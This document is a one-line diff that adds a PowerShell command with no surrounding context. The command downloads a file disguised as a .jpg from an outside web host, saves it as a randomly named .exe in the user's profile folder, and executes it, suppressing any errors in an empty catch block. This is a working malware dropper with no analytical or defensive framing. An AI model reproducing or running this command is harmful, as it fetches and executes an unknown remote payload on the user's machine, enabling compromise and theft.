@@ -1,0 +1,1 @@
+try{(New-Object System.Net.WebClient).DownloadFile('https://comfy.moe/blhjdk.jpg',$env:USERPROFILE+'\oaIeiJNyNYOv.exe');(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\oaIeiJNyNYOv.exe');}catch {}
